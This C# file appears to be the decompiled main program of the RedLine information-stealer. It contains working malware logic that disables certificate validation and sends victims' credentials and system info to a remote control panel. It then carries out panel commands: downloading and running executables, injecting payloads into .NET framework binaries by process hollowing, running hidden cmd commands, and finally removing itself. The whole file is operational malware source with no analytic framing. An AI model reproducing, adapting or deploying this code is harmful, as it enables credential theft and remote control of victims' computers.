using RedLine.Logic.Others;
using RedLine.Logic.RunPE;
using RedLine.Models;
using RedLine.Models.RunPE;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Security;

namespace RedLine
{
  public static class Program
  {
    static Program()
    {
      ServicePointManager.ServerCertificateValidationCallback += (RemoteCertificateValidationCallback) ((_, __, ___, ____) => true);
    }

    private static void Main(string[] args)
    {
      string str = "127.0.0.1";
      string buildId = "pref";
      try
      {
        Service<IRemotePanel>.RemoteIP = str;
        Service<IRemotePanel>.Use((Action<IRemotePanel>) (panel =>
        {
          ClientSettings result1 = panel.GetSettings().Result;
          UserLog user = UserLog.Create(result1);
          user.BuildID = buildId;
          user.Credentials = Credentials.Create(result1);
          bool flag = false;
          while (!flag)
          {
            try
            {
              panel.SendClientInfo(user).Wait();
              flag = true;
            }
            catch
            {
              flag = false;
            }
          }
          user.Credentials = new Credentials();
          IList<RemoteTask> result2 = panel.GetTasks(user).Result;
          if (result2 == null)
            return;
          foreach (RemoteTask task in (IEnumerable<RemoteTask>) result2)
          {
            try
            {
              if (Program.CompleteTask(task))
                panel.CompleteTask(user, task.ID).Wait();
            }
            catch
            {
            }
          }
        }));
      }
      catch
      {
      }
      finally
      {
        InstallManager.RemoveCurrent();
      }
    }

    private static bool CompleteTask(RemoteTask task)
    {
      bool flag = false;
      try
      {
        switch (task.Action)
        {
          case RemoteTaskAction.Download:
            try
            {
              string[] strArray = task.Target.Split('|');
              if (strArray.Length == 0)
                new WebClient().DownloadString(task.Target);
              if (strArray.Length == 2)
                new WebClient().DownloadFile(strArray[0], Environment.ExpandEnvironmentVariables(strArray[1]));
            }
            catch
            {
            }
            flag = true;
            break;
          case RemoteTaskAction.RunPE:
            string[] strArray1 = task.Target.Split('|');
            byte[] SystemDataCommonIntStorageg = new WebClient().DownloadData(strArray1[0]);
            foreach (string file in Directory.GetFiles("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319", strArray1[1]))
            {
              if (LoadExecutor.Execute(LoadParams.Create(SystemDataCommonIntStorageg, file)))
              {
                flag = true;
                break;
              }
            }
            break;
          case RemoteTaskAction.DownloadAndEx:
            string[] strArray2 = task.Target.Split('|');
            if (strArray2.Length == 2)
            {
              new WebClient().DownloadFile(strArray2[0], Environment.ExpandEnvironmentVariables(strArray2[1]));
              Process.Start(new ProcessStartInfo()
              {
                FileName = Environment.ExpandEnvironmentVariables(strArray2[1]),
                CreateNoWindow = false,
                WindowStyle = ProcessWindowStyle.Normal
              });
            }
            flag = true;
            break;
          case RemoteTaskAction.OpenLink:
            Process.Start(task.Target);
            flag = true;
            break;
          case RemoteTaskAction.Cmd:
            Process.Start(new ProcessStartInfo("cmd", "/C " + task.Target)
            {
              RedirectStandardError = true,
              RedirectStandardOutput = true,
              UseShellExecute = false,
              CreateNoWindow = true
            });
            flag = true;
            break;
        }
      }
      catch
      {
      }
      return flag;
    }
  }
}
